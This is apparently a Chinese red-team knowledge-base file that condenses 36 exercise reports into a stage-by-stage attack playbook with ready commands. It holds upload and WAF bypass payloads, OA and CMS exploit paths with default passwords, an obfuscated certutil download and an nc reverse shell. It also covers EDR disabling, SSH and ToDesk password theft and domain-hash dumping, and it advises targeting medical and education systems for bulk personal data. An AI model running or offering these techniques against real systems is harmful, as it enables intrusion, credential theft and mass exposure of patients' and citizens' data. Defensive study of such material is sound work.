# 实战攻击链案例深挖（红队攻防演练 · 完整链路）

> **回查原文** → `ima-retrieval-index.md` §2.4（按攻击链六阶段给关键词；ima `src报告/其他/Web` folder_id 见该表）。

> **来源**：ima 知识库 `src` → `src报告/其他/Web/`（folder `folder_7492580988187114`）中的「实战渗透与攻防演练报告」类。
> **口径**：筛选标准是**内容体裁为"完整攻击链复盘"**（而非漏洞类型教程/电子书/蓝队防守/HW 资料包），共 **36 份**，去重后仍为 36 份（无重复副本）。原始清单见 `_work/unique-list-chain.md`，精读稿 `_work/deep-chain-a~c.md`，构成调研 `other-census.md`。
> **读取情况**：**35/36 成功**，1 份失败（`内网渗透-思路.pdf`，仅提取到标题+图片占位，疑似封面节选）。
> **本文件定位**：与 `logic-web-cases.md`（业务逻辑）、`idor-cases.md`（越权）不同——那两份是**单点漏洞**的深挖；本文件是**从外网入口打到内网/域控/云**的**链条级**复盘，回答"打进去之后怎么走"。
> **相邻文件**：单点技术细节去 `waf-bypass.md`（上传绕过）、`file-upload-test.md`、`middleware-unauth-test.md`（Nacos/Actuator）、`deserialization-test.md`（Shiro/XStream/Fastjson）、`sqli-advanced-test.md`、`nday-watchlist-2026.md`（国产 OA Nday）。

---

## §0 使用红线（先看，不可违反）

对齐 `SKILL.md` 安全红线与 `edge-asset-hunting.md` §0：**不社工 / 不钓鱼 / 不买号 / 不截真实个人数据**。

本批 36 份是**授权红队演练**复盘，其中相当一部分手法**本质是社工/钓鱼/水坑**。这些内容**只作威胁认知与防守复盘，SRC 场景一律不做**，已在下方逐处标注 `⚠️ 红线`。同理，**免杀对抗、EDR 卸载、启停对方安全设备**的部分，SRC 场景不做（演练场景才有授权）。

**SRC 可直接用的部分**：资产测绘与目标选取、弱口令与撞库（在授权范围内）、文件上传/WAF 绕过、国产 OA 与中间件 Nday、未授权接口枚举、配置与凭据泄露、路径穿越读配置、单点 SQLi → 命令执行（只读验证），以及**从"打点"到"拿下一个系统的证据链"**的完整性思路。

---

## 一、总纲：一条完整攻击链的六个阶段

| 阶段 | 目标 | 本批 36 份里的"最稳动作" | 易被忽略的胜负手 |
|------|------|------------------------|-----------------|
| **① 边界突破（打点）** | 拿到第一个入口 | 弱口令 + 未授权接口 + 历史版本 Nday | **优先打医疗/教育的外网后台**（一个后台=数万公民信息，性价比远高于打内网） |
| **② 首次权限** | WebShell / 命令执行 | 文件上传绕过 WAF；Nday RCE | 上传点往往藏在**注册页/头像/论坛编辑器** |
| **③ 上线（C2）** | 稳定控制 | 免杀马；**不出网时走 DNS 隧道 / certutil 分段落地** | **站库分离判定**（写 bat `ping dnslog` 到 web 路径，收到即非分离） |
| **④ 提权** | SYSTEM / root | 土豆家族；**MSSQL `xp_cmdshell` 拿 SYSTEM**（提权失败时的替代） | `whoami` 回 `iis apppool` 说明是低权应用池，别急着提权 |
| **⑤ 横向（内网）** | 更多主机 | 抓凭据 → 密码喷洒 → 代理中转 | **双网卡主机是跨段关键**；`mstsc /admin` 绕远程桌面许可 |
| **⑥ 目标（域/云/靶标）** | 域控 / vCenter / 云控制台 / 靶标 | `dcsync` 导全域哈希；Zerologon；vCenter/ESXi 漏洞；**云 AK/SK 一键接管** | 堡垒机、OA 配置文件是"一把撸穿"的入口 |

**一句话结论**：本批所有成功复盘的共同点是——**打点靠"信息"（弱口令/泄露/历史漏洞），内网靠"凭据"（抓密码→喷洒），收尾靠"集权系统"（域控/堡垒机/vCenter/云控制台）**。技术难度普遍不高，拼的是**目标选取**与**信息敏感度**。

---

## 二、阶段① 边界突破：目标选取与信息收集

### 2.1 目标选取（决定这一场值不值）

| 判据 | 来源案例 | 做法 |
|------|---------|------|
| **医疗/教育外网后台优先** | 快速打点（洪椒） | "外网后台即海量公民信息，性价比高于打内网"——单后台可查数万患者处方 |
| 同 IP 旁站/子域老系统 | 某市景区、某集团 | 靶标打不动就转旁站；子域 `x4.*.com:18003` 目录索引发现十几年前的 WebService |
| 供应商/开发单位（供应链） | 精准的供应链打击 | 目标打不动就**打它的技术支持方**——开发单位多套同源系统，一挖到通杀 |
| 云上第三方 SaaS | 供应链+社工金融 | 供应商系统在云上、不属 IT 资产，但**连的是真实员工**，是优质跳板 |
| 开发单位/外包公司暴露面 | 快速打点 | `icp.name="xxx有限公司"` 常搜出 **demo 测试域名被当生产用** |

### 2.2 资产测绘手法清单

| 手法 | 命令/工具 | 案例 |
|------|----------|------|
| 备案主体反查 | `hunter: icp.name="XX省科技信息中心"`、`ip.province=="XX省"` 防打偏 | 聊一聊红队打点那些事 |
| 单 IP 全端口 | Quake 单 IP 探端口；`goby`/`dddd` 扫 C 段 | 同上 |
| C 段统计脚本 | 读 IP 列表算 `/24` 段资产数，**≥5 优先打** | 某地级市攻防技战术提炼 |
| IP 段上下浮动 | 只发现 2 个 IP 时，上下各 +5~10 个 IP 探边界 | 同上 |
| 被动接口扫描 | Burp 装 **APIKit** 自动扫 Swagger/未授权接口；**HaE** 被动标记 Shiro `rememberMe` | 多份 |
| 组织架构情报 | 官网 + 企查查看持股结构；**控股子公司也可作为目标** | 同上 |
| 邮箱收集 | `phonebook.cz`；`site:"xxx.com" 招聘/举报` 找私人邮箱 | ⚠️ 后者为钓鱼前置，红线 |
| 源码/地图文件 | `*.js.map` + reverse-sourcemap 还原源码；`.ds_store` + **DS_Walk** 还原目录 | 红队外网打点、地市级演练 |
| 小程序/公众号 | 反编译提取 IP 与接口 | 同上 |

### 2.3 弱口令与字典构造（最高性价比的一步）

**字典构造规则（来自多份实战，可复用）**：

```
单位简写 + 分隔 + 年份/常见后缀    Bjyd / Bjyd@123 / Bjyd@666 / Bjyd@2020-2022
单位全拼/域名 + @ + 年份          xxx@2020 / 域名@2020
姓名全拼 / 姓名简拼                zhangsan / zs
工号 0000-9999，或客服电话套位数
默认弱口令池                      123456 / 12345678 / admin888 / Aa1234 / Aa12345
```

**高价值命中场景（本批实证）**：

| 场景 | 具体做法 | 案例 |
|------|---------|------|
| 登录页泄露工号/姓名 | 页面暴露管理员姓名+工号 → 试 `工号+123456` 一键进入 | 如何通过一个工号打入内网 |
| 系统间撞库 | 拿到一个系统的 `账号+123456`，去其他系统（CRM/网盘/OA）复用 | 同上、对某集团渗透 |
| 网盘/协同系统 | **中文姓名转拼音**再爆破，60+ 弱口令 | 对某集团渗透 |
| VPN 初始密码 | 翻 OA 流程发现初始口令习惯（`123456`/`Aa1234`），**按入职时间排序赌新员工未改** | 同上 |
| SaaS 单 IP 多站点 | 一个后台弱口令 + `aspx` 上传即 getshell | 快速打点 |
| 旁站老站 | 老 ASP.NET 系统默认口令命中率高 | 某市景区 |

> **经验**：无域环境、无 0day 时，弱口令 + 撞库 + 密码喷洒是**唯一稳定出分路径**（见"对某集团渗透"：20+ 台服务器全靠弱口令+密码喷洒）。

### 2.4 文件上传绕过 WAF 全景表（本批最密集的技术点）

| 绕过手法 | 具体写法 | 适用/来源 |
|---------|---------|----------|
| **双 Content-Disposition + 大小写 + `$20`** | `Content-Disposition: form-datA*;name="file" filename1123="1.aspx";$20 filename="test.asp"` | ASP/IIS（省 hvv 打点入口） |
| **`filename;;;;` + 非常规后缀 `.cer`** | `.NET` 站，配合 `[ValidateInput(false)]` 接口 | .Net 代码审计案例 |
| **双后缀 `.png.asp`** | 白名单用 `Extension.IndexOf(".jpg")>-1` 判断**整个文件名**（非扩展名）→ `123123.png.asp` 既过校验又被解析 | hw打点之运气使然（经典逻辑缺陷） |
| **分块传输 / boundary 加空格 / 多 Content-Disposition / 脏字符** | 组合拳，逐个试 | 打点-EDR-内网-横向-Vcenter |
| **`Content-Encoding:` 传输编码** | 绕过**内容检测**（后缀已过但内容被拦时） | 省 hvv 打点入口 |
| **Tomcat WAR 后缀拆分** | `filename=".w\a\r"`（用 `\` 拆开 `war` 关键字） | 聊聊红队奇技淫巧 |
| **WAF 特征隐匿** | OPTIONS 请求 + 静态资源 uri + 缩短 payload；burp 被识别就换 yakit | 红队外网打点 |
| **ueditor catchimage 中转** | `/UEditor/net/controller.ashx?action=catchimage` + 本地 `python -m http.server` 起图片马服务 | 某 985 渗透实训 |
| **ewebeditor 改样式后缀** | 弱口令登 ewebeditor → 激活 → 样式管理里改允许后缀 | 针对某银行资产 |
| **假白名单（审计源码识破）** | `123.jsp$.jpg` 被拦 → 读源码发现是"假白名单"，可直接传 `test_*.jsp` | 某厂的红队考核 |
| **私有上传接口 fuzz** | 盲打历史漏洞不如**fuzz 出私有上传接口**（回显路径） | 某 985 渗透实训 |

> 通用细节：**访问 500 不一定是系统问题，先排除"后缀没被解析"**；`<% echo %=now()%>` 验证 asp 是否真执行；统一上传接口做了白名单时，**论坛/头像/富文本编辑器常漏网**（见"如何通过一个工号打入内网"）。

---

## 三、阶段② 边界突破：国产 OA / 中间件 / 框架 Nday 速查

| 目标 | 入口 | 关键 payload / 命令 | 案例 |
|------|------|-------------------|------|
| **泛微 E-Cology V9** | `/mobile/%20/plugin/browser.jsp` 的 `keyword` SQL 注入 | **必须三层 URL 编码**：`sqlmap -r sqli.txt --tamper=urlencode3`；MSSQL 不支持堆叠 → 手开 `xp_cmdshell` | 硬啃靶标之泛微OA |
| **致远 OA** | 默认口令 `audit-admin/seeyon123456`；前台 `POST /seeyon/rest/authentication/ucpcLogin` 拿 cookie | copyfile 坑：双引号前加 `\`、写 root 目录、**文件名不能重复**、`//` 后换行 | 红队外网打点 |
| **泛微 OA** | 默认口令 `sysadmin/1`、`sysadmin/Weaver@2001` | — | 同上 |
| **O2OA** | 默认口令 `xadmin/o2oa@2022` 登 `/x_desktop/` → 脚本引擎 RCE | `POST /x_program_center/jaxrs/invoke/c5/execute?v=6.3`，`scriptEngine` 执行 `Runtime.getRuntime().exec()` | 某集团 Web 打点 |
| **用友 NC** | 配置文件 `/home/NC65/ierp/bin/prop.xml` 泄露库凭据；`/fs/console` 改 `login:"true"` | — | 某地级市技战术、`idor-cases.md` §二 |
| **DTcms 4.0** | 默认 `admin/admin888` 登后台 | `/admin/settings/templet_file_edit.aspx?path=wqgwhg&filename=../../web.config` 读配置拿 1433 账密 | 记录一次攻防演练实战过程 |
| **帝国 CMS（EmpireCMS）** | 已登后台即可，多条 getshell 链 | ① CVE-2018-18086 导入系统模型（传 `.mod` 写 `e/admin/jmc.php`）② CVE-2018-19462 `into outfile` ③ 自定义页面写 `echo system('cmd')`（`@eval` 会被转义）④ 计划任务 + SQL 写文件，`e/admin/task.php?ecms=dotask&id=2` 触发 ⑤ 首页方案模板 `base64_decode` | 艰难打点之帝国cms |
| **Shiro** | `rememberMe` 被动识别（HaE）+ 默认 key `kPH+bIxk5D2deZiIxcaaaA==` | `shiro_tool.jar` 探 key；**Yso 需重编译**（1.8.3）解决 CB 链版本不一致；特征绕用 burp-awesome-tls | 多份 |
| **Spring Boot** | `CVE-2022-22947` 打云主机 root；`actuator` 未授权 | `/actuator/nacosconfig` 常泄露 Nacos 地址与账号 | 快速打点 |
| **Nacos** | 指纹 `HTTP 404 + 8848` | 任意用户注册登后台拿 AK/SK；**Nacos token 伪造** `POST /nacos/v1/auth/users/login` | 红队外网打点、快速打点 |
| **Jenkins/XXL-JOB 等组件** | 未授权面清单见 `middleware-unauth-test.md` 与 `idor-cases.md` §二 C | — | — |

**未授权接口枚举两张"金矿图谱"**：

- **Swagger/Knife4j**：`/v2/api-docs`、`/swagger-ui.html`。**当 Swagger 需鉴权时，把 JWT 填进 Google 插件 `x-permit-token/x-user-token` 即可解锁**（某集团 Web 打点）。
- **APIKit 被动扫描 + reverse-sourcemap**：从 JS 里拿全量接口，再对 `/getUser?userid=` 一类做**语义字典 Fuzz**——参数值字典从"纯数字"换成**中文姓名全拼**才命中（`other-census.md` §6.2）。

---

## 四、阶段③ 上线：不出网、站库分离与 EDR 对抗

### 4.1 不出网 / 站库分离的落地姿势（本批最实用的一节）

| 场景 | 解法 | 细节 |
|------|------|------|
| **仅 DNS 出网** | CS 走 **DNS listener**；配合 base64 分片落地 | 金融 PC 常"限 http 不限 dns"，DNS 上线保底 |
| **AC 设备按 Host 白名单放行** | 把 CS listener 的 `HTTP Host Header` **配成目标官网域名** → http 上线成功 | 这是过 AC 的关键（供应链+社工金融案例）；`http-host-header-test.md` 有此面的通用手法 |
| **exe 落不了地** | `CertUtil -decode a.txt a.exe`；`certutil -encode c2.exe out.txt` 先转 txt 再落地 | 多个案例共用；MSSQL 站库分离场景 |
| **大马上线被打断** | 免杀马 1M+ 需**分段**：脚本分块 POST（`chunk_size=1000`）+ 代理轮换 + 延时 + 3 次重试 + 去重 | 三大坑：封 IP / 漏发 / 重发 |
| **certutil 本身被拦** | 混淆调用：`copy certutil.exe xxx.exe` + `xxx.exe -url"""ca^che -spl""it -f http://x/1.exe` | 近期红队攻防实战趣事小记 |
| **webshell 写不进中文目录** | `sqlmap --file-write ashell.bat --file-dest c:\users\public\music\ashell.bat`，bat 内容 `echo ^<%eval request("aaaaaa")%^> >> D:\中文目录\Content\images\logo1.asp`，再 os-shell 跑 bat | 聊聊红队奇技淫巧 |
| **HTTP 特征太明显** | 用 **Neo-reGeorg 的 404 模板**隐藏隧道：`python3 neoreg.py generate -k xxx --file 404.html --httpcode 404`（先 copy 目标 404 页做伪装） | 省护红队的经历 |
| **隔离网段只有某台机可达** | CS `rportfwd` / `bind_tcp` 中转；`frpc` 多层（VPS ← 内网机 ← 双网卡机） | 两份案例 |

**站库分离判定（实用 checklist）**：
```
1. 报错注入拿到 web 绝对路径（如 D:/jmc/123/ccc/）
2. echo aaaa > D:/jmc/123/ccc/jmc.txt  → 确认能否写
3. 写 bat 内容为 ping 自己的 dnslog，投到 web 路径
4. dnslog 收到 → 非站库分离；没收到 → 站库分离，改走 DNS 隧道落地 exe
```

### 4.2 EDR / 杀软对抗（多为演练场景，SRC 慎用）

| 手法 | 具体操作 | 备注 |
|------|---------|------|
| **删 EDR 的 RDP 二次认证组件** | `C:\Program Files\Sangfor\EDR\agent\bin\sfrdpverify.exe` 删除或重命名 | 深信服 EDR；**最高频的 EDR 绕过点** |
| **深信服 EDR 控制台接管** | 替换 `sys_account.json` 即可重置控制台密码（17+ 版本口令 `sangforedr123`），控全盘终端 | 近期红队攻防实战趣事小记 |
| **兜底：直接用提权模块到 SYSTEM 再卸 EDR** | webshell 提权模块（哥斯拉）直上 system → 加 `admin123/123456` → 反向卸载 EDR | 快速打点 |
| **删蓝队加固文件反制** | 蓝队在 webshell 目录放 `web.config` 禁脚本（访问报 `403.1`）→ 找**任意文件删除**漏洞删掉它 → 再放一个允许脚本的 `web.config` 做权限维持 | .Net 代码审计案例 |
| **独立加载 + 反沙箱** | 先跑正常业务行为再加载 payload（过 QVM）；反沙箱判断出口 IP/桌面文件数/微信注册表/pagefile.sys/LANG | ⚠️ 红线（免杀）；仅认知 |
| **资源/图标伪装** | ResourceHacker 加资源图标；`garble -literals -seed`、`-ldflags '-s -w' -H windowsgui'` | ⚠️ 红线（免杀）；注意 `-literals` 反而会触发 360，需实测 |

---

## 五、阶段④ 提权与凭据获取

### 5.1 提权手法清单

| 手法 | 命令/要点 | 适用 |
|------|----------|------|
| 土豆家族 | `RottenPotato`/`JuicyPotato`(MS16-075)/`BadPotato`/`SweetPotato`(`CLSID 4991D34B...`)/`LSTAR`/`printspoofer` | Windows；单个失败就换，反射提权常有一个能过 |
| **MSSQL `xp_cmdshell`（提权失败的替代）** | 从配置文件找到 1433 连接串，代理连 MSSQL → 开 `xp_cmdshell` → `nt authority\system` | 土豆全失败时的**最稳兜底** |
| phpMyAdmin 无 `secure_file_priv` | `SET GLOBAL general_log=ON; SET GLOBAL general_log_file='C:/phpStudy/WWW/lkhacker.php'` 再写一句话 | MySQL getshell |
| MS17-010 | 直打 meterpreter 不稳 → 改 **`ms17_010_command` 远程执行**（加用户/开 3389） | 老 Windows（2003/2008/2012） |
| 应用池账户确认 | IIS 下 `whoami` 回 `iis apppool\xxx` 说明是低权，需先提权 | 所有 IIS 案例 |

### 5.2 凭据收集（内网的燃料）

| 来源 | 工具/手法 | 案例 |
|------|----------|------|
| 内存 | `mimikatz`；`reg save hklm\sam/system/security` → `secretsdump.py` **离线解密** | 多域环境 |
| 域 | `lsadump::dcsync /domain:xx /all /csv` 一次导 8000+ / 4.3 万域用户哈希 | 多域环境 |
| 浏览器 | **BrowserGhost**（Chrome/Edge 登录态与密码） | 多份 |
| 远程工具 | Xshell 会话 → **星号查看器 / SharpDecryptPwd** 还原明文；Navicat 密码 | 三层内网案例 |
| **SSH 明文（冷门高效）** | `strace -f -p $(pgrep "sshd -D") -e trace=read,write -s 32 2>/tmp/sshd.log &` 后 grep，**蹲管理员周期登录抓明文密码** | 聊红队奇技淫巧、趣事小记 |
| 文件/桌面 | 桌面 txt、回收站、**QQ 默认路径搜 `.jpg/.png/.txt/.docx/.xlsx`**、阿里云盘密码本 | 渊龙 Sec、Vcenter 案例 |
| OA/SFTP 台账 | SFTP 里 360G/9w+ 文件，**先按扩展名排序（xls/txt 优先）**再翻 | 对某集团渗透 |
| 配置文件 | `.bash_history` → `application-mysql.yml`（库/Redis 口令）；`weaver.properties`/`fc.properties`/`prop.xml` | 多份 |
| 第三方远控配置 | **ToDesk `config.ini` 的 `tempAuthPassEx`**：把密文填到本地 ToDesk 配置里，**本地客户端会解密显示临时密码** → 直接远程控服务器 | 渊龙 Sec、某 985（极高复用） |
| 域控工具残留 | 桌面 `ldapadmin` 本地缓存域控凭据（明文/哈希）可直连三台域控导出域管 | 某车企 |

---

## 六、阶段⑤ 横向与阶段⑥ 收尾（域 / 堡垒机 / 云 / 虚拟化）

### 6.1 横向手法

| 手法 | 细节 |
|------|------|
| PTH + 批量上线 | `wmic /node:IP process call create "powershell -nop -w hidden -c IEX(...)"` |
| SMB beacon | 不出网主机用 smb beacon 横向；跳板机 `run autoroute -s 192.168.52.0/24` 加路由 |
| 密码喷洒 | `fscan`/`gscan` 拿密码本喷 C 段；**抓到一台密码后整段复用** |
| RDP 许可绕过 | **`mstsc /admin`** 直接登录（"无远程桌面授权"报错不是权限问题） |
| 桌面克隆 | `clone.exe` 克隆 administrator 桌面，人一登录就看到原管理员桌面 |
| 内网靶标定位 | **Host 头碰撞**：`req.Host=domain` 打内网隐藏靶标（工具 host_scan/Hosts_scan） |
| 3389 加用户三技巧 | `net1` 代 `net`、`/ad` 代 `/add`、`test$` 隐藏用户 |
| 降低告警 | 用**第二台跳板**中转；上线弹 `msgbox` 安抚在线管理员（避免被踢） |

### 6.2 集权系统 = 一击撸穿

| 系统 | 入口 | 案例 |
|------|------|------|
| **域控** | `nltest /domain_trusts`、`netdom query pdc`、`net time /domain` 定位；**Zerologon `CVE-2020-1472`** 置空密码一键拿域控；密码复用打第二台域控 | 多域环境、某市景区（78 台主机） |
| **堡垒机** | 指纹：齐治 / 中远麒麟 / 优炫 / 帕拉迪。SQL 注入拿明文密码，或 `UPDATE employee SET password='d5df2...'`（`admin@123456`）改密后绑定用户 → `ssh -p 22 用户@堡垒机IP` 选序号接管；优炫 Web 内单点登录自动连 3389 | 某地级市技战术 |
| **vCenter / ESXi** | 扫到 vCenter，`CVE-2021-21972/21985` 无效时**全端口扫出 41433 MSSQL**，用已收集口令碰撞登入；ESXi 漏洞一锅端全部虚拟机（27 台） | Vcenter 案例、三层内网 |
| **K8s / etcd** | `etcdctl --endpoints=... get / --prefix --keys-only \| grep secret` → 读 `/registry/secrets/...` 拿 SA token → `kubectl auth can-i create pods` 校验 → 建 `hostPath: /` 恶意 Pod → `chroot /mnt` → `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc host port >/tmp/f` | K8S 接管逃逸 |
| **云控制台（AK/SK）** | Gitblit/Git 仓库配置里翻出阿里云 AK/SK → 用 `dark-kingA/cloudTools` **一键接管控制台**（57 个资源）；`.ds_store` 还原出的 `.py` 文件里常有明文 key | 供应链打击、地市级演练 |
| **企业微信后台** | 弱口令登后台 → 「软件更新下发/强制升级」把正常软件换成后门 | ⚠️ 涉钓鱼投递，红线 |

### 6.3 一次典型"完整链"还原（用于理解节奏）

```
① hunter icp.name 收资产 → ② 老 OA 弱口令进后台，扒通讯录
→ ③ 用通讯录姓名转拼音喷网盘/新 OA（60+/50+ 弱口令）
→ ④ 翻 OA 流程拿 VPN 初始密码，按入职时间赌新员工未改
→ ⑤ 登 VPN 拿 SFTP，按扩展名排序翻台账（xls 优先）
→ ⑥ 用台账拼密码本，fscan 密码喷洒内网（20+ 台服务器）
→ ⑦ 裁判判目标出局
```
> 全过程**零 0day、零社工**，靠"信息搬运 + 撞库 + 密码喷洒"，是本批最"SRC 友好"的一条链。

---

## 七、按功能点的排查 Checklist（打点视角 → 也可反查防守）

**外网入口**
- [ ] 登录页是否暴露姓名/工号/邮箱/开发厂商（→ 弱口令与历史漏洞线索）
- [ ] 是否有注册功能（→ 上传点、越权、SQLi）
- [ ] 前台路由是否可直拼（`#/dashboard`）
- [ ] JS 里是否留 `*.js.map`、注释里的测试账号、硬编码 key

**接口面**
- [ ] `/v2/api-docs`、`/swagger-ui.html`、`/actuator/*`（重点 `env`/`heapdump`/`nacosconfig`）
- [ ] `*/authinfo`、`*List`、`*ForPage`、`getUserList` 一类"列表接口"是否未授权
- [ ] `/resetPassword` 是否只传 `userid` 就能改密（→ 未授权密码重置）
- [ ] 上传接口：统一接口做白名单时，**论坛/头像/富文本编辑器**是否漏网
- [ ] 导出/下载接口的 `filePath`/`fileName` 参数（→ 任意文件读）

**服务器面**
- [ ] `whoami` 确认权限层级；`systeminfo` 确认版本（选土豆）
- [ ] `tasklist` 找第三方远控（**ToDesk/向日葵** → config.ini）
- [ ] 桌面/回收站/QQ 目录/云盘客户端/浏览器/远程工具缓存
- [ ] 配置文件与 `.bash_history`
- [ ] 是否站库分离（→ 决定落地方式）
- [ ] 出网策略（先 `ping dnslog` 试 DNS，再试 HTTP）

**内网面**
- [ ] 双网卡/多网段主机（跨段关键）
- [ ] 域：`net config workstation`、`nltest /domain_trusts`、`net group "Domain Admins" /domain`
- [ ] 集权：堡垒机 / vCenter / K8s / 云控制台 / OA 后台
- [ ] 老系统（MS17-010）、弱口令服务（RDP/SSH/MSSQL）

---

## 八、案例索引表（36 份 → 章节）

| # | 案例（原始文件名） | 主链 | 落章 |
|---|-----------------|------|------|
| 1 | 从外网打点到拿下多重域环境 | WebLogic → 多域控 | §6.2 |
| 2 | 攻防---红队外网打点实战案例分享 | 打点技战法大合集 | §2.4/§3 |
| 3 | 攻防----记一次省护红队的经历 | nday→neoreg→frp→医疗数据 | §4.1/§6.1 |
| 4 | 攻防实战-mssql突破不出网到自动化内网漫游 | SQLi→DNS 隧道→自动漫游 | §4.1 |
| 5 | 攻防实战-钓鱼手法及木马免杀技巧 | ⚠️ 钓鱼+免杀 | §4.2（仅认知） |
| 6 | 攻防演练某车企攻防小记 | shiro→ldapadmin→docker 逃逸 | §5.2/§6.2 |
| 7 | 攻防演练-硬啃靶标之泛微OA拿下靶标 | 泛微 browser.jsp 三层编码 | §3 |
| 8 | 红队技战术｜供应链+社工通关某金融单位 | ⚠️ 钓鱼水坑 + **AC Host 白名单绕** + Zerologon | §4.1/§6.2 |
| 9 | 红队篇-针对某集团的Web打点突破 | token 伪造→任意文件读→o2oa RCE | §2.4/§3/§5.2 |
| 10 | 记录一次攻防演练实战过程 | DTcms 读 web.config→SSRF→XSS | §3/§2.4 |
| 11 | 记某众测曲折"内网上线"拿下多个严重 | 卡巴+安全狗 → **ToDesk 取密** | §5.2 |
| 12 | 记一次攻防演练中的快速打点 | 医疗/教育优先 → 弱口令 → 云接管 | §2.1/§2.3/§3 |
| 13 | 记一次攻防演练中对某集团的渗透 | 弱口令+撞库+喷洒（零 0day） | §6.3 |
| 14 | 记一次红队攻防中.Net代码审计与防守方的对抗 | 源码审计 + 蓝队反制破解 | §2.4/§4.2 |
| 15 | 记一次实战攻防(打点-Edr-内网-横向-Vcenter) | 上传绕 WAF → EDR → Vcenter | §2.4/§4.2/§6.2 |
| 16 | 艰难打点之帝国cms-多层次多方向深度利用 | 帝国 CMS 五条 getshell 链 | §3 |
| 17 | 近期红队攻防实战趣事小记 | 越权改密 + certutil 混淆 + EDR 控制台 | §5.1/§5.2/§4.2 |
| 18 | 聊聊那些红队攻击中的奇技淫巧 | **strace 抓 SSH 密码** / 中文目录写马 / WAR 拆分 | §4.1/§5.2 |
| 19 | 聊一聊红队打点那些事 | 信息收集与字典构造方法论 | §2.1/§2.2/§2.3 |
| 20 | 某厂的红队考核 | 假白名单 + 同库横穿三系统 | §2.4/§5.1 |
| 21 | 某次省hvv-步步艰辛的打点入口 | 双 Content-Disposition 组合拳 | §2.4 |
| 22 | 某次支援打点——你对java有多熟悉 | XStream/Fastjson/Tomcat 不出网 | §3 |
| 23 | 某地级市攻防技战术提炼 | Host 碰撞 + 堡垒机接管 | §6.1/§6.2 |
| 24 | 某市攻防演练内网漫游实战 | WebService SQLi → 双域控 | §5.1/§6.2 |
| 25 | 内网靶场1（红日） | phpMyAdmin → MS17-010 加用户 | §5.1 |
| 26 | 内网渗透-思路 | **读取失败**（疑似封面节选） | §十一 |
| 27 | 如何通过一个工号打入内网 | 工号泄露 → 撞库 → 论坛上传 | §2.3/§2.4 |
| 28 | 渗透实训-记一次艰难的打点过程(某985) | 备份源码 → ueditor → ToDesk | §2.4/§5.2 |
| 29 | 实战_记一次精准的供应链打击 | 开发单位 → **未授权改密** → AK/SK | §2.1/§3/§6.2 |
| 30 | 实战攻防-K8S接管逃逸容器到宿主机 | etcd → token → Pod 逃逸 | §6.2 |
| 31 | 一次地市级攻防演练记录 | knife4j → 未授权 → .ds_store → 云接管 | §2.2/§3/§6.2 |
| 32 | 一次在工作组的内网里渗透到第三层内网 | 工作组无域 → 三层打穿 | §6.1 |
| 33 | 针对某银行资产的攻防演练 | ewebeditor/TP5 → 企业微信（⚠️） | §2.4/§3 |
| 34 | hw打点之运气使然 | CNVD 反查 + `.png.asp` 双后缀 | §2.4 |
| 35 | 【红队战法】多角度钓鱼 | ⚠️ LNK/SPF 钓鱼 | §4.2（仅认知） |
| 36 | 落落同学图文分享从0到1的那些事 | SRC 成长复盘（非攻击链） | 见下 |

> **第 36 份说明**：性质与其他 35 份不同，是**新人成长叙事 + 方法论**（非技术攻击链），核心可复用点只有一条——**用 FindSomething 找到接口后要"换个用户再点一遍"**，第一个用户没数据就换，越权/未授权常由此暴露。已在 `idor-cases.md` §三 覆盖。

---

## 九、战果与定级观察

- **本批 36 份均为红队演练/授权复盘**，不以单洞定级；决定得分的是**控制范围**：拿到域控/vCenter/云控制台/堡垒机 = 满分；只拿到一台 Web = 分很低。
- **"打点快"是硬指标**：多份复盘明确写了"慢一步被同目标其他队先交，直接出局"（省护、快速打点）。演练里**刷分效率 > 单点深度**。
- **医疗/教育类目标的单点价值极高**：一个外网后台 = 数万患者处方 / 千万级 HIS 数据 / 全校身份证。这与 `edusrc-cases.md` §六"优先打能批量出数据的接口"完全一致。
- **供应商/第三方资产在演练中常被拒收**（参见 `idor-cases.md` §十"麦当劳 SRC 定级尺度"：供应商资产不在奖励范围），但**演练场景恰恰相反**——供应链是官方鼓励的路径。**两个场景的判定尺度不同，不要混用**。

---

## 十、素材缺口与已知坑

| 项 | 情况 | 处置 |
|----|------|------|
| `内网渗透-思路.pdf`（207KB） | 读回内容仅标题 + 两图占位，**正文缺失**，疑似只提取了封面页 | 需在 ima 客户端打开原文件确认；**不要当成"内容为空"就丢弃** |
| 大文件 3 份 | `一次在工作组的内网里渗透到第三层内网`（26MB）、`攻防---红队外网打点实战案例分享`（9.2MB）、`近期红队攻防实战趣事小记`（7.6MB）、`某地级市攻防技战术提炼`（6.9MB） | 只提炼框架 + 代表技术点，**细节未穷尽**，需要时回 ima 读原文 |
| `攻防演练某车企攻防小记.docx`（18KB） | 作者自述"过程记录已丢失，仅留总结" | 细节天然缺失，非读取问题 |
| 本批读取成功率高 | **35/36 成功**，未遇 `code:220030` | 与 `其他/Web` 普查结论一致：该目录读取失败率低 |

---

## 十一、后续扩展位（第 2a 批剩余部分）

本文件只消化了「其他」762 份中的**实战攻防类 36 份**。按 `other-census.md` §八 的三分法，2a 批还剩：

| 子项 | 条数 | 目标文件 | 说明 |
|------|------|---------|------|
| **漏洞类型与代码审计专题** | 115 | 抽"审计切入点"补 `researcher` 类 / 新建 `code-audit-cases.md` | 含 `(java代码审计)某商城系统`、`因酷网校…JAVA审计`、`某菠菜代码白盒审计`、`任意文件覆盖上传-b站`、`绕过人脸识别`（后者涉红线需筛） |
| **云原生专题** | 散落 | 补 `middleware-unauth-test.md` / `cloud-ide-codex-rce-chain.md` | Spring Boot `actuator/env + heapdump` 组合（浙江计量院案例）、K8s、Nacos |
| **企业/单位测试报告** | 131 | 与 `logic-web-cases.md`/`idor-cases.md` **交叉查重后再取** | 避免重复沉淀 |
| **SRC 方法论** | 57 | 与 `src-platform-and-search.md` 合并或新建 `src-hunting-mindset.md` | `第一更：教育src如何日刷百分`、`第三更：接口漏洞实战`、`第七更：SG的常见方法` 等系列 |
| **EduSRC 侧 9 篇 S2-020 / get shell HTML** | 9 | 并入 `edusrc-cases.md` 新增"服务器权限获取"章 | 正方学工、强智教务、南软 V5.0、先极实验/创新管理、微宏 OA、AIC 智慧校园 |
| **2b 归档 / 2c 丢弃** | ≈350 | 只出标题清单 | 科普 102 / HW 18 / 电子书 16 / 制度 8 / EduSRC 单点提交 56 / 图片与副本 |

> **交叉引用**：本文件产出的 **AC 设备 Host 白名单绕过**、**EDR 二次认证文件删除**、**ToDesk config.ini 取密**、**`.png.asp` 双后缀** 属高复用技巧，已在 `other-census.md` §6.1 与 `ima-corpus-progress.md` 中登记；其中上传类绕过建议同步补进 `file-upload-test.md` 与 `waf-bypass.md`（见 §十二）。
